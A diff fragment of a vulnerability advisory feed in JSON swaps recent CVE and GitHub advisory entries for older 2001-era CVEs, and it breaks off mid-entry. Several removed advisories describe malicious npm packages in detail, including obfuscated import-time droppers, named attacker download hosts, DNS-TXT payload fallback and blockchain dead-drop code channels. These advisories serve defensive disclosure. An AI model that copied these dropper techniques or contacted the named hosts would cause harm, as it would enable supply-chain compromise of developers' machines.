-      "id": "CVE-2026-90513",
-      "summary": "A flaw has been found in simalexan api-lambda-send-email-ses up to bda6869aa81371d1e872242e74fe7d953edb818d. This issue affects the function SES.sendEmail of the file template.yml of the component API Gateway Endpoint. This manipulation of the argument toEmails/ccEmails/replyToEmails/subject/message causes missing authentication. It is possible to initiate the attack remotely. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available. The project was informed of the problem early through an issue report but has not responded yet.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90513",
-        "https://github.com/simalexan/api-lambda-send-email-ses/issues/9",
-        "https://github.com/simalexan/api-lambda-send-email-ses",
-        "https://vuldb.com/cve/CVE-2026-90513",
-        "https://vuldb.com/submit/911886"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1233",
-      "summary": "Netware Enterprise Web Server 5.1 running GroupWise WebAccess 5.5 with Novell Directory Services (NDS) enabled allows remote attackers to enumerate user names, group names and other system information by accessing ndsobj.nlm.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-08-14",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/204875",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6987",
-        "http://www.securityfocus.com/archive/1/204875",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6987"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1145",
-      "summary": "fts routines in FreeBSD 4.3 and earlier, NetBSD before 1.5.2, and OpenBSD 2.9 and earlier can be forced to change (chdir) into a different directory than intended when the directory above the current directory is moved, which could cause scripts to perform dangerous actions on the wrong directories.",
-      "cvssScore": 6.2,
-      "severity": "Medium",
-      "published": "2001-08-17",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:40.fts.v1.1.asc",
-        "http://archives.neohapsis.com/archives/netbsd/2001-q3/0204.html",
-        "http://www.iss.net/security_center/static/8715.php",
-        "http://www.openbsd.org/errata28.html",
-        "http://www.osvdb.org/5466"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0776",
-      "summary": "saned in sane-backends 1.0.7 and earlier does not properly \"check the validity of the RPC numbers it gets before getting the parameters,\" with unknown consequences.",
+      "id": "CVE-2001-1159",
+      "summary": "load_prefs.php and supporting include files in SquirrelMail 1.0.4 and earlier do not properly initialize certain PHP variables, which allows remote attackers to (1) view sensitive files via the config_php and data_dir options, and (2) execute arbitrary code by using options_order.php to upload a message that could be interpreted as PHP.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-09-22",
+      "published": "2001-07-02",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://ftp.sco.com/pub/updates/OpenLinux/3.1.1/Server/CSSA-2004-005.0/CSSA-2004-005.0.txt",
-        "http://www.debian.org/security/2003/dsa-379",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2003:099",
-        "http://www.novell.com/linux/security/advisories/2003_046_sane.html",
-        "http://www.redhat.com/support/errata/RHSA-2003-278.html"
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0029.html",
+        "http://www.iss.net/security_center/static/6775.php",
+        "http://www.securityfocus.com/bid/2968",
+        "http://www.squirrelmail.org/changelog.php",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0029.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0777",
-      "summary": "saned in sane-backends 1.0.7 and earlier, when debug messages are enabled, does not properly handle dropped connections, which can prevent strings from being null terminated and cause a denial of service (segmentation fault).",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-09-22",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.sco.com/pub/updates/OpenLinux/3.1.1/Server/CSSA-2004-005.0/CSSA-2004-005.0.txt",
-        "http://www.debian.org/security/2003/dsa-379",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2003:099",
-        "http://www.novell.com/linux/security/advisories/2003_046_sane.html",
-        "http://www.redhat.com/support/errata/RHSA-2003-278.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0731",
-      "summary": "Directory traversal vulnerability in Worm HTTP server allows remote attackers to read arbitrary files via a .. (dot dot) attack.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-10-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0111.html",
-        "http://www.osvdb.org/1535",
-        "http://www.securityfocus.com/bid/1626",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5148",
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0111.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0732",
-      "summary": "Worm HTTP server allows remote attackers to cause a denial of service via a long URL.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-10-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0111.html",
-        "http://www.securityfocus.com/bid/1626",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5149",
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0111.html",
-        "http://www.securityfocus.com/bid/1626"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-F33V-QQXM-M6M9",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package's main entry index.js unconditionally requires./lib/config, which is a ~4MB obfuscator.io-style blob (string array of ~23,981 entries with a rotating decoder and hex-escaped literals). The readable identifiers inside that payload include execSync (child_process) and axios (HTTP client) — the local-execution and outbound-network primitives used by droppers and exfiltration stagers — and the payload runs at import time via a top-level IIFE. The wrapper index.js copies the pino logger API surface but never uses the config export; its only effect is to force the obfuscated blob to load on require(). The package name hardhat-hold is a one-token variant of the Ethereum tooling package hardhat, while the README impersonates the pino logger (including shields.io badges that still point at pino's repository), and package.json carries an unrelated boilerplate description about vulnerability management. The combination of name/README/description mismatch with an obfuscated import-time payload carrying shell-exec + HTTP primitives is the canonical typosquat-dropper shape.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-19",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/hardhat-hold/v/2.0.1",
-        "https://www.npmjs.com/package/hardhat-hold/v/2.21.0",
-        "https://github.com/advisories/GHSA-f33v-qqxm-m6m9"
-      ],
-      "vulnerableProducts": [
-        "hardhat-hold npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-GVXQ-2RQ2-F7X6",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package advertises EVM address validation but performs no local validation. Its single exported function validated(e) in index.js issues axios.get against a hardcoded destination and appends the caller-supplied argument to the URL, causing whatever the consuming application passes in (EVM addresses, keys, or arbitrary user data) to be transmitted to a remote host the caller never configured. The destination is deliberately hidden: a scrambled string array is joined, ROT13-transformed, and reversed at runtime to reconstruct https://api-ivalidte.vercel.app/app/api/ — a typosquat-shaped Vercel host that does not correspond to any documented service for this package. The obfuscation of the destination combined with the mismatch between the advertised purpose (local validation) and the actual behavior (remote relay to an author-controlled endpoint) is the silent-relay shape.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-19",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/evm-validation/v/1.0.3",
-        "https://www.npmjs.com/package/evm-validation/v/1.0.2",
-        "https://www.npmjs.com/package/evm-validation/v/1.0.4",
-        "https://github.com/advisories/GHSA-gvxq-2rq2-f7x6"
-      ],
-      "vulnerableProducts": [
-        "evm-validation npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-24M2-6FRM-VXJ3",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nOn require('devplatform-sdk'), index.js loads _polyfill.js which auto-invokes start(): it selects a per-OS payload path, fetches a binary from string-concatenated Cloudflare Workers hosts (oob-worker.cf102-baf.workers.dev, oob-worker.cf99-9b3.workers.dev, oob-worker.cf101-adf.workers.dev) with DNS TXT fallback under sdk.dl.wel1.ru / ext.dl.wel1.ru / pkg.dl.wel1.ru / net.dl.wel1.ru, writes it under /var/tmp or %TEMP% with a camouflaged name (.cache_<rand> on Unix, dotnet_diag_<rand>.exe on Windows), chmods 0o755, and detached-spawns it via /bin/sh -c or cmd /c start /b. Evasion features accompany the drop-and-run: hostnames assembled from split fragments via.join(''), the dropped binary renamed to look like a system cache/diagnostic file, a mtime-based stamp file at /tmp/.analytics_state (or %TEMP%/analytics_state) suppressing re-runs, stderr silenced via a no-op writer, and DO_NOT_TRACK / ANALYTICS_OPT_OUT cover strings framing the behavior as telemetry. The package advertises itself as a lightweight SDK wrapper; the load-time behavior is a binary dropper delivering arbitrary attacker-controlled native code to the installer.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-05",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/devplatform-sdk/v/35.6.1",
-        "https://github.com/advisories/GHSA-24m2-6frm-vxj3"
-      ],
-      "vulnerableProducts": [
-        "devplatform-sdk npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-VRH4-RF6W-3256",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nOn require(), index.js loads _support.js whose top-level main() downloads a platform-specific binary from author-controlled hosts assembled via string-array concatenation (oob-worker.cf99-9b3.workers.dev, oob-worker.cf100-416.workers.dev, oob-worker.cf103-070.workers.dev, sdk.dl.wel1.ru, ext.dl.wel1.ru, pkg.dl.wel1.ru, net.dl.wel1.ru) with a DNS-TXT base64 fallback. The fetched bytes are written to /tmp or %TEMP% under stealth names such as dotnet_diag_<hex>.exe and.cache_<hex>, chmod'd 0755 on POSIX (with the API name assembled as 'chmod'+'Sync'), and executed detached via /bin/sh -c '<path> &' or cmd /c start /b. A second dropper is shipped in lib/telemetry.js (81KB, framed as an 'Analytics SDK') implementing the same base64-decode + chmod-via-string-concat + detached spawn pattern as an alternate loader. child_process is resolved via require('child_' + 'process') and destination hostnames are split across arrays to evade static analysis. No version pin, no hash or signature verification, and a /tmp stamp file is used for rate-limiting. The package name and metadata claim a mobile BNPL floating-button UI component, which conflicts with the shipped behavior.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-05",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/bnpl-blocks-mobile-bnpl-floating-button/v/35.3.6",
-        "https://github.com/advisories/GHSA-vrh4-rf6w-3256"
-      ],
-      "vulnerableProducts": [
-        "bnpl-blocks-mobile-bnpl-floating-button npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-PVQ7-RM52-M5G7",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nOn require, _bridge.js fetches a platform-specific binary from string-split-obfuscated Cloudflare Workers hosts (oob-worker.cf103-070.workers.dev, oob-worker.cf101-adf.workers.dev, oob-worker.cf100-416.workers.dev) and wel1.ru subdomains (sdk.dl.wel1.ru, ext.dl.wel1.ru, pkg.dl.wel1.ru, net.dl.wel1.ru), with a DNS-TXT reassembly fallback. The payload is written to /tmp or %TEMP% under disguised names (dotnet_diag_<rand>.exe on Windows,.cache_<rand> on Unix), chmodded 0755, and spawned detached via cmd.exe or /bin/sh. Destinations are assembled from split string arrays to evade static analysis, and a marker-file cache plus DISABLE_TELEMETRY/ANALYTICS_OPT_OUT/DO_NOT_TRACK opt-out gates hide re-execution. The package advertises itself as an unrelated 'search input SDK', so the fetched binary has no relationship to the declared purpose. Loading the module in any consumer executes attacker-controlled native code on the installer's host.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-05",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/bnpl-blocks-atom-bnpl-search-input/v/35.9.7",
-        "https://github.com/advisories/GHSA-pvq7-rm52-m5g7"
-      ],
-      "vulnerableProducts": [
-        "bnpl-blocks-atom-bnpl-search-input npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-9F9C-QWVH-F45Q",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nOn require(), index.js loads _vendor.js which immediately runs a main() routine that downloads a platform-specific binary from Cloudflare Workers endpoints reconstructed at runtime by joining split character arrays (e.g. ['oob-worke','r.cf100-416.workers.d','ev'].join('')), with a DNS TXT fallback resolving *.dl.wel1.ru (sdk./ext./pkg./net.dl.wel1.ru). The fetched bytes are written to /tmp or %TEMP% under disguised names such as.cache_<hex> or dotnet_diag_<hex>.exe, chmod 0755, and executed detached via spawn('/bin/sh', ['-c', fp + ' &']) or spawn('cmd',...). The package advertises itself as a 'shared timeline library' — none of the fetch-and-execute behavior is required by that purpose. String-split hostname reconstruction is used to defeat static URL/domain scanners.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-05",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/bigops-products-timeline/v/35.8.9",
-        "https://github.com/advisories/GHSA-9f9c-qwvh-f45q"
-      ],
-      "vulnerableProducts": [
-        "bigops-products-timeline npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-7PP9-3QQC-VC84",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nOn require() of bigops-auth-interceptor@35.7.2, index.js loads _vendor.js which selects a platform-specific binary URL, downloads bytes over HTTPS from one of four string-concatenation-obfuscated Cloudflare Workers mirrors (oob-worker.cf99-9b3.workers.dev, oob-worker.cf103-070.workers.dev, oob-worker.cf102-baf.workers.dev, oob-worker.cf100-416.workers.dev), writes them to a temp path under a disguised name (dotnet_diag_<hex>.exe on Windows,.cache_<hex> on Linux), chmods 0755, and spawns the file detached via /bin/sh -c or cmd.exe. A DNS TXT-record fallback channel (c.<domain> returns a chunk count, then i.<domain> TXT records are concatenated and base64-decoded into the payload) is implemented against sdk.dl.wel1.ru, ext.dl.wel1.ru, pkg.dl.wel1.ru, and net.dl.wel1.ru, providing covert payload retrieval when HTTPS is blocked. A run-once marker file (.analytics_state) prevents repeated execution. Destination hosts are unrelated to any legitimate publisher of the package's stated purpose; the fetched bytes are unpinned, unsigned, and platform-selected.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-05",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/bigops-auth-interceptor/v/35.7.2",
-        "https://github.com/advisories/GHSA-7pp9-3qqc-vc84"
-      ],
-      "vulnerableProducts": [
-        "bigops-auth-interceptor npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-7FVF-FGWQ-85Q6",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nbin/install/install.js appends a heavily obfuscated top-level IIFE (obfuscator.io-style rotated string array `_0x240a`/`_0x4963` with arithmetic index decoding) after the benign install() helper. The payload queries public Ethereum RPCs and etherscan.io for transactions from the hardcoded sender address 0xa322E5f3..., decodes the transaction `to` field as an IPv4 address, fetches an XOR-encrypted body from that host, and executes it via `eval(prefix+xor(body))` and a detached `spawn('node', ['-e',...], {detached:true}).unref()`. The package's main entry (bin/index.js) unconditionally requires./install/install, so the IIFE runs whenever the package is required or the CLI is invoked. The attacker controls the fetched payload by publishing new Ethereum transactions from the sender address; there is no version pinning, no signature check, and the destination host rotates on-chain. Decoded strings inside the string array include `eth_getBlockByNumber`, `etherscan.io`, `eval`, and `spawn`.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-19",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/anhn-cli/v/1.1.4",
-        "https://github.com/advisories/GHSA-7fvf-fgwq-85q6"
-      ],
-      "vulnerableProducts": [
-        "anhn-cli npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-PVR5-M9HX-XXFR",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package advertises itself as a payment utility library, but its public API (validateRecipient, routePayment, processPayment) discards the caller-supplied recipient address and unconditionally substitutes a hardcoded Ethereum wallet (0xA930Ca05ea5548aE8ea0817087833A96453BED08). Any application using this library to route payments will silently send funds to that address instead of the intended recipient. In-source comments explicitly self-label the substitution as the 'malicious part' disguised as a 'safety feature'. In addition, postinstall.js runs on npm install and POSTs a JSON payload containing the package name, the hardcoded wallet, a timestamp, and process.cwd() to a hardcoded webhook.site collector, sending installer-side working-directory information to a non-first-party endpoint without consent.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-18",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/agora402-payment-utils/v/1.0.0",
-        "https://github.com/advisories/GHSA-pvr5-m9hx-xxfr"
-      ],
-      "vulnerableProducts": [
-        "agora402-payment-utils npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-7G98-GRC6-6XJH",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\ndist/index.js appends a heavily obfuscated obfuscator.io-style payload (string array _0x240a of length 303, decoder _0x4963, string-array rotation) after the clean TypeScript-compiled validation code. None of this obfuscated code is declared in dist/index.d.ts and it executes at top level on `import '@wizloft/harness-validation'`. Decoded string fragments include Ethereum RPC / block-explorer hostnames (`h.drpc.org`, `pc.io/eth`, `stapi.io`), a hardcoded attacker Ethereum address (`0xa322E5f3...`), Etherscan-style query parameters (`?module=account`, `filterby=from`), a spoofed browser User-Agent, and `application/json` / `content-encoding` request framing. The payload queries the block explorer for transactions from the hardcoded wallet, extracts a URL/payload from the transaction data, then fetches and executes the resolved content — a blockchain-based dead-drop that lets the publisher rotate the delivered code by posting a new transaction from that wallet, giving them a persistent mutable remote-code channel against every process that imports the library. Sibling packages in the @wizloft/* namespace (@wizloft/harness-evidence, @wizloft/harness-kernel) are declared dependencies at matching alpha versions and exhibit the same trojanized-library shape.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-19",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/@wizloft/harness-validation/v/0.1.1-alpha.3",
-        "https://github.com/advisories/GHSA-7g98-grc6-6xjh"
-      ],
-      "vulnerableProducts": [
-        "@wizloft/harness-validation npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-P4GF-F4RJ-HFH8",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\ndist/index.js of @wizloft/harness-plugin-repository-files ships a small legitimate wizloft-harness repository-files plugin followed at line 209 by a ~35KB obfuscator.io-packed IIFE (303-entry rotated string array _0x240a with decoder _0x4963, control-flow flattening, hex-named identifiers). Decoded strings in the appended segment include Ethereum JSON-RPC and block-explorer endpoints (drpc.org, publicnode.com, blockscout, an etherscan-style txlist/account API), a hardcoded mixed-case ETH address prefix 0xa322E5f3..., a forged Chrome User-Agent, brotli/gzip decompression, AbortController-based fetch, and a custom /0x/ls exfil path with x-payload-* headers. The payload runs at module load whenever a consumer imports the package and has no relationship to the advertised purpose of reading repository files for a harness runtime. Only the trailing segment is obfuscated; the legitimate plugin portion is plain ESM, indicating a hostile payload smuggled onto an otherwise-clean plugin build.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-08-19",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://www.npmjs.com/package/@wizloft/harness-plugin-repository-files/v/0.1.1-alpha.3",
-        "https://github.com/advisories/GHSA-p4gf-f4rj-hfh8"
-      ],
-      "vulnerableProducts": [
-        "@wizloft/harness-plugin-repository-files npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0246",
-      "summary": "Multiple PHP remote file inclusion vulnerabilities in (1) fonctions.lib.php, (2) derniers_commentaires.php, and (3) admin.php in Les Commentaires 2.0 allow remote attackers to execute arbitrary PHP code via the rep parameter.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-11-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107584083719763&w=2",
-        "http://secunia.com/advisories/10768/",
-        "http://www.securityfocus.com/bid/9536",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15010",
-        "http://marc.info/?l=bugtraq&m=107584083719763&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-85363",
-      "summary": "## Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in Microsoft.WindowsDesktop.App.Runtime (WPF). This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nAttacker-controlled XPS glyph coordinates can overflow destination pointer arithmetic in `CD3DGlyphBank::RectFillAlpha`, causing an out-of-bounds write and process termination.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/469\n\n## CVSS Details\n\n- **Version:** 3.1\n- **Severity:** High\n- **Score:** 8.8\n- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`\n\n- **Weakness:** CWE-190 (Integer Overflow or Wraparound)\n## Affected Platforms\n\n- **Platforms:** Windows\n- **Architectures:** All\n\n## <a name=\"affected-packages\"></a>Affected Packages\n\nThe vulnerability affects Microsoft .NET projects that use an affected package version listed below.\n\nPackage name | Affected version | Patched version\n--------- | ---------------- | ---------------\n[Microsoft.WindowsDesktop.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-arm64) | >= 8.0.0, <= 8.0.31 | 8.0.32\n[Microsoft.WindowsDesktop.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x64) | >= 8.0.0, <= 8.0.31 | 8.0.32\n[Microsoft.WindowsDesktop.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x86) | >= 8.0.0, <= 8.0.31 | 8.0.32\n[Microsoft.WindowsDesktop.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-arm64) | >= 10.0.0, <= 10.0.12 | 10.0.13\n[Microsoft.WindowsDesktop.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x64) | >= 10.0.0, <= 10.0.12 | 10.0.13\n[Microsoft.WindowsDesktop.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x86) | >= 10.0.0, <= 10.0.12 | 10.0.13\n[Microsoft.WindowsDesktop.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-arm64) | >= 9.0.0, <= 9.0.20 | 9.0.21\n[Microsoft.WindowsDesktop.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x64) | >= 9.0.0, <= 9.0.20 | 9.0.21\n[Microsoft.WindowsDesktop.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x86) | >= 9.0.0, <= 9.0.20 | 9.0.21\n[Microsoft.WindowsDesktop.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-arm64) | >= 11.0.0-preview.1, <= 11.0.0-rc.1 | 11.0.0-rc.2\n[Microsoft.WindowsDesktop.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x64) | >= 11.0.0-preview.1, <= 11.0.0-rc.1 | 11.0.0-rc.2\n[Microsoft.WindowsDesktop.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.WindowsDesktop.App.Runtime.win-x86) | >= 11.0.0-preview.1, <= 11.0.0-rc.1 | 11.0.0-rc.2\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf using a package listed in [affected packages](#affected-packages), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n1. To fix the issue please install the latest version of .NET. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET SDKs.\n2. If your application references the vulnerable package, update the package reference to the patched version. You can list the versions you have installed by running the `dotnet --info` command.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue).\n\nSecurity reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2026-85363](https://www.cve.org/CVERecord?id=CVE-2026-85363)\n\n### Acknowledgements\n\n- Ky0toFu (@ky0tofu)\n\n### Revisions\n\nV1.0 (10/13/2026): Advisory published.",
-      "cvssScore": 8.8,
+      "id": "CVE-2001-1161",
+      "summary": "Cross-site scripting (CSS) vulnerability in Lotus Domino 5.0.6 allows remote attackers to execute script on other web clients via a URL that ends in Javascript, which generates an error message that does not quote the resulting script.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-10-13",
-      "modified": "2026-10-13",
+      "published": "2001-07-02",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.iss.net/security_center/static/6789.php",
+        "http://www.kb.cert.org/vuls/id/642239",
+        "http://www.osvdb.org/1887",
+        "http://www.securityfocus.com/archive/1/194465",
+        "http://www.securityfocus.com/archive/1/194609"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1441",
+      "summary": "Cross-site scripting (XSS) vulnerability in VisualAge for Java 3.5 Professional allows remote attackers to execute JavaScript on other clients via the URL, which injects the script in the resulting error message.",
+      "cvssScore": 6.8,
+      "severity": "Medium",
+      "published": "2001-07-02",
